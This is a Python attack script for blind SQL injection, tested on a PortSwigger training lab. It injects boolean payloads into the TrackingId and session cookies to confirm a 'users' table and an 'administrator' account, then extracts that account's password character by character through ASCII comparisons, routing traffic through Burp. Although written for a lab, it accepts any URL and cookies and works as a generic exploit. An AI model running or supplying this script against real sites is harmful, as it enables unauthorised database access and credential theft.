#!/usr/bin/env python3

# MySQL Blind SQLI with Conditional Responses
# Tested on PortSwigger lab "Blind SQL injection with conditional responses"

import sys # Provides access to system functions, including command line argument
import requests # Facilitates HTTP requests to web servers, enabling interaction with online resources
import urllib # Used to encode data in URLs, thus preventing errors and security problems during HTTP requests.
import urllib3 # HTTP request management, including connection management and security warnings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disables warnings related to insecure HTTP requests (HTTP)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # To send the requests through Burp

# Test if Vulnerable
def test(url, Vulnerable_Cookie, Session_Cookie):
    true_payload = "' AND 1=1--"
    false_payload = "' AND 1=2--"
    table_name_payload = "' AND (SELECT 'a' FROM users LIMIT 1)='a'--" # Modify "users" according to the table name you are looking for
    username_payload = "' AND (SELECT username FROM users WHERE username='administrator')='administrator'--" # Modify "administrator" according to the username you are looking for
    message = "Welcome" # Modify according to returned message

    # Cookies to test for SQLI
    cookies = {'TrackingId': Vulnerable_Cookie, 'session': Session_Cookie} # Change cookie names if necessary

    # Test all the cookies to find a vulnerable one
    def is_response_true(payload):
        cookies['TrackingId'] = Vulnerable_Cookie + urllib.parse.quote(payload)
        cookies['session'] = Session_Cookie + urllib.parse.quote(payload)
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        return message in response.text

    if not is_response_true(true_payload):
        print(f'[-] Unable to test TRUE statement')
        sys.exit(-2)
    print(f'[+] TRUE statement OK')

    if is_response_true(false_payload):
        print(f'[-] Unable to test FALSE statement')
        sys.exit(-2)
    print(f'[+] FALSE statement OK')

    if not is_response_true(table_name_payload):
        print(f'[-] This is not the correct table name')
        sys.exit(-3)
    print(f'[+] You find a correct table name: users')

    if not is_response_true(username_payload):
        print(f'[-] The column "username" or/and the user "administrator" does not exist')
        sys.exit(-4)
    print(f'[+] Column "username" and user "administrator" do exist')

# Payload Function

def sqli(url, Vulnerable_Cookie, Session_Cookie):
    char_extracted = ""
    i = 1 # Start with first letter of the password
    print("Searching for the user's password")

    while True:
        found = False
        total_failed_characters = 0
        total_possible_characters = 127 - 31

        for j in range(31, 127):
            payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            encoded_payload = urllib.parse.quote(payload)
            cookies = {'TrackingId': Vulnerable_Cookie + encoded_payload, 'session': Session_Cookie + encoded_payload}
            request = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            if "Welcome" not in request.text:
                sys.stdout.write('\r' + char_extracted + chr(j))
                sys.stdout.flush()
                found = True  # Mark a character as found
            else:
                char_extracted += chr(j)
                sys.stdout.write('\r' + char_extracted)
                sys.stdout.flush()
                break  # Exit the loop if the character has been found
            total_failed_characters += 1

        if total_failed_characters >= total_possible_characters:
            break  # Exit the loop if all characters have been tested unsuccessfully
            print("Fin du test")
        i += 1

# Main Function
def main():
    if len(sys.argv) <= 3:
        print("Usage: python3 script_name.py <URL> <Vulnerable Cookie> <Session Cookie>")
        sys.exit(1)

    url = sys.argv[1]
    Vulnerable_Cookie = sys.argv[2]
    Session_Cookie = sys.argv[3]

    test(url, Vulnerable_Cookie, Session_Cookie)
    sqli(url, Vulnerable_Cookie, Session_Cookie)

if __name__ == "__main__":
    main()
